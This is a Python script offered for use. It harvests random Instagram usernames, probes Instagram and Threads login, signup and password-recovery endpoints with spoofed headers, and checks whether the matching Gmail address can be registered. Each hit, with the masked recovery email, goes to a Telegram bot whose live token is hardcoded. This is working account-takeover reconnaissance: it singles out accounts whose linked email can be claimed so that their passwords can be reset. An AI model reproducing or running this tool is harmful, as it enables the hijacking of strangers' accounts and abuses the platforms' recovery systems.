import os
import random
import requests
import sys
import time
from uuid import uuid4
from faker import Faker
from secrets import token_hex
from user_agent import generate_user_agent
import re
import datetime
from threading import Thread
try:
    import os
    import random
    import requests
    import sys
    import time
    from uuid import uuid4
    from faker import Faker
    from secrets import token_hex
    from user_agent import generate_user_agent
    import re
    import datetime
except ModuleNotFoundError:
    os.system("pip install requests")
    os.system("pip install faker")
    os.system("pip install uuid")
    os.system("pip install user_agent")

goodIg = 0
hits = 0
badIG = 0
goodEm = 0
badEm = 0
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = random.randint(100, 300)
O = f'\x1b[38;5;{memo}m'
print("1 Second please")
r = requests.post('https://signup.live.com',headers={
            'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
        })
mc = r.cookies.get_dict()['amsc']
ca = r.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1].encode("ascii").decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")

token = '6904252629:AAEaqxfD4tnQ_Vv2zJ_FeLusx-WnGdOrkik'
ID = 6762002309




requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Bot started ....')
 


def linked():
    
    
        for i in range(10):
            Thread(target=SearchRandomly).start()
    
         
def info(email):
    global hits
    user = email.split('@')[0]
    headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }

    data = {
        'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{uuid4()}","guid":"{uuid4()}","device_id":"{uuid4()}","query":"{user}"}}',
        'ig_sig_key_version': '4',
    }

    res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)
    if '"status":"ok"' in res.text:
        rest = res.json()['email']
    else:
        rest = 'Band Requests!'

    try:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        uid = uuid4().hex.upper()
        csr = token_hex(8) * 2
        miid = token_hex(13).upper()
        dtr = token_hex(13)
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en;q=0.9',
            'cookie': f'ig_did={uid}; datr={dtr}; mid={miid}; ig_nrcb=1; csrftoken={csr}; ds_user_id=56985317140; dpr=1.25',
            'referer': f'https://www.instagram.com/{user}/?hl=ar',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'viewport-width': '1051',
            'x-asbd-id': '198387',
            'x-csrftoken': str(csr),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
        }
        rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}', headers=headers, proxies={'http': proxy})
       
        try:
            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}")
            da = re.json()['date']
        except:
            da = 'No Date'
        tim = datetime.datetime.now()
        hits += 1
        tlg = f'''
⋘─────━*ATTAULLAH*━─────⋙
[♻️]𝐇𝐢𝐭𝐬 ==> {hits}
[⬆️]𝐓𝐢𝐦𝐞 ==> {tim}
[💌] 𝐄𝐦𝐚𝐢𝐥  ==> {email}
[💬] 𝐄-𝐦𝐚𝐢𝐥 𝐑𝐞𝐬𝐭 ==> {rest}
[↩️] 𝐔𝐫𝐥 ==> https://www.instagram.com/{user}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 :  @attaullah
by b4b agent
'''
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
        print(F + tlg)
        with open('hits.txt', 'a') as f:
            f.write(tlg + '\n')

    except Exception as e:
        print(e)
        tlg = f'''
 username = {user}
 email = {email}
 BY : @attaullah
        '''
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
        with open('hits.txt', 'a') as f:
            f.write(tlg + '\n')

def SeverThreads(email):
    csr = token_hex(8) * 2
    uid = uuid4().hex.upper()
    miid = token_hex(13).upper()
    url = "https://www.threads.net/api/v1/web/accounts/login/ajax/"
    payload = f"enc_password=mahos9966##$%&optIntoOneTap=false&queryParams=%7B%7D&stopDeletionNonce=&textAppStopDeletionToken=&username={email}"
    headers = {
  'User-Agent': f"{generate_user_agent()}",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
  'sec-ch-ua-model': "\"SM-G610F\"",
  'x-ig-app-id': "1412234116260832",
  'sec-ch-ua-mobile': "?1",
  'x-instagram-ajax': "0",
  'sec-ch-ua-platform-version': "\"8.1.0\"",
  'x-asbd-id': "129477",
  'sec-ch-ua-full-version-list': "\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5615.137\"",
  'sec-ch-prefers-color-scheme': "light",
  'x-csrftoken': f"{csr}",
  'sec-ch-ua-platform': "\"Android\"",
  'origin': "https://www.threads.net",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.threads.net/login/?hl=ar",
  'accept-language': "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
  'Cookie': f"csrftoken={csr}; mid={miid}; ig_did={uid}"
}

    response = requests.post(url, data=payload, headers=headers)
    if '"user":true,' in response.text:
        goodIg += 1
        info(email)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""") 
    elif '"message":"عذرًا، كلمة السر غير صحيحة. يرجى التأكد من صحتها.","status":"fail"' in response.text:
        badIG += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")
    else:
        badIG += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")
    












def ServerwebLogin(email):
    global goodIg, badIG
    session = requests.Session()
    rr = session.get("https://www.instagram.com/api/v1/web/accounts/login/ajax/")
    cookies = rr.cookies.get_dict()
    cookies.update({"ps_n": "1", "ps_l": "1", "dpr": "2"})
    csr = str(cookies.get("csrftoken"))
    url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    payload = f"enc_password=mahos999667$$##&optIntoOneTap=false&queryParams=%7B%7D&trustedDeviceRecords=%7B%7D&username={email}"
    headers = {
  'User-Agent': f"{generate_user_agent()}",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
  'x-ig-www-claim': "0",
  'sec-ch-ua-platform-version': "\"10.0.0\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua-full-version-list': "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
  'sec-ch-prefers-color-scheme': "dark",
  'x-csrftoken': str(csr),
  'sec-ch-ua-platform': "\"Android\"",
  'x-ig-app-id': "1217981644879628",
  'sec-ch-ua-model': "\"ART-L29N\"",
  'sec-ch-ua-mobile': "?1",
  'x-instagram-ajax': "1013281536",
  'x-asbd-id': "129477",
  'origin': "https://www.instagram.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.instagram.com/accounts/login/",
  'accept-language': "ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6",
}

    response = session.post(url, data=payload, headers=headers, cookies=cookies)
    if '"user":true,' in response.text:
        goodIg += 1
        info(email)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")   
    elif '"message":"عذرًا، كلمة السر غير صحيحة. يرجى التأكد من صحتها.","status":"fail"' in response.text:
        badIG += 1
        SeverThreads(email)       
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")
    else:
        SeverThreads(email)
   
    
       
    







def FromCreate(email):
    global goodIg, badIG
    csr = token_hex(8) * 2
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/accounts/signup/email/',
    'user-agent': generate_user_agent(),
    'x-csrftoken': csr
}

    data = {
    'email': email,
}

    rrs = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
   
    if '"available":true' in rrs.text:
       badIG += 1
       os.system('cls' if os.name == 'nt' else 'clear')
       print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")
    elif "email_is_taken" in rrs.text:
       goodIg += 1
       info(email)
       os.system('cls' if os.name == 'nt' else 'clear')
       print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")       
    else:
        ServerwebLogin(email)










def getTl():
    try:
        n1 = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(3, 9)))
        host = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-YE,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-arch": "\"\"",
            "sec-ch-ua-bitness": "\"\"",
            "sec-ch-ua-full-version": "\"116.0.5845.72\"",
            "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-model": "\"ANY-LX2\"",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"13.0.0\"",
            "sec-ch-ua-wow64": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
            "x-client-data": "CJjbygE=",
            "x-same-domain": "1",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            'user-agent': str(generate_user_agent()),
        }

        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
            'user-agent': generate_user_agent(),
        }
        data = {
            'f.req': '["' + tok + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        try:
            os.remove('tlcok.txt')
        except:
            pass
        with open('tlcok.txt', 'a') as f:
            f.write(tl + '|' + host + '\n')
    except Exception as e:
        print(e)
        getTl()


def CheckGmail(email):
    global goodEm, badEm
    email = email +'@gmail.com'
    try:
        with open("tlcok.txt", "r") as f:
            for line in f:
                tl = line.strip().split('|')[0]
                host = line.strip().split('|')[1]
    except:
        getTl()
        with open("tlcok.txt", "r") as f:
            for line in f:
                tl = line.strip().split('|')[0]
                host = line.strip().split('|')[1]
    nono = email.split('@')[0]
    cookies = {'__Host-GAPS': host}
    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
        'user-agent': generate_user_agent(),  
    }
    params = {'TL': tl}
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + nono + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = requests.post(
        'https://accounts.google.com/_/signup/usernameavailability',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print(response.text)
    if '"gf.uar",1' in str(response.text):
        goodEm +=1
        FromCreate(email)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")
    
    elif '"gf.uar",2' in str(response.text) or '"gf.uar",3' in str(response.text):
        badEm += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}___           _
|_ _|_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___
 | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \\
 | || | | \__ \ || (_| | (_| | | | (_| | | | | | |
|___|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                        |___/

{F}[1]{F}Availables IG ==> {F}[ {goodIg} ]
{E}[2]{E}Bads IG ==> {E}[ {badIG} ]
{B}[3]{B}Good Emails ==> {B}[ {goodEm} ]
{X}[4]{X}Bads Emails ==> {X}[ {badEm} ]
{M}[5]{M}Email ==> {O} [ {email} ]
""")
    else:
        getTl()
        CheckGmail(email)
        

        



def SearchRandomly():
  while True:
    try:
      lsd=''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
      id=str(random.randrange(10000,7407225345))
      headers = {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.instagram.com',
      'referer': 'https://www.instagram.com/0s9s/',
      'user-agent': str(generate_user_agent()),
      'x-fb-lsd': 'Tato'+lsd,
  }
      data = {
      'lsd': 'Tato'+lsd,
      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
      'doc_id': '7397388303713986',
  }
      hh = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()      
      FuckuSer = hh['data']['user']['username']
      email = FuckuSer
      CheckGmail(email)
      
    except:
    	pass
    
    

def Start():
    print('Good luck Dev @maho_s9')     
#Done Fuck BY AHMED ALHRRANI SUIIIII..!
linked()    
